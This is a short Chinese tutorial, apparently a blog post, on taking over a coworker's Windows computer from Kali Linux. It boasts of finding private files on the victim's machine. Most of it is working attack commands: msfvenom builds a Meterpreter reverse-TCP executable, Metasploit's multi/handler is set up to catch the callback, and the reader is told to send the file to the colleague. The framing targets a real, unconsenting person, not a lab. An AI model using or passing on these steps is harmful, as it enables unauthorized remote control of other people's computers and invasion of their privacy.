大家好，我是sean，今天给大家带来的是利用kali linux黑掉同事的widons机器，还在同事机器里发现了80G高防的不可描述文件~，好了废话不多说，教程开始。


环境：


Kali linux一台

同事的机器是windos（windos多少我也不知道）


步骤 1：创建 Payload 程序


root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.161.131 LPORT=5555  --format=exe -o /root/test.exe


 

步骤 2：运行 mfsconsole 命令启动 msf 命令窗口并进行利用


 

开始利用工具~（利用工具监听同事上线）

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

payload => windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost 192.168.161.131

lhost => 192.168.161.131

msf exploit(multi/handler) > set lport 5555

lport => 5555

msf exploit(multi/handler) >  exploit


 

然后把做好的test.Exe发给同事


 

成功上线
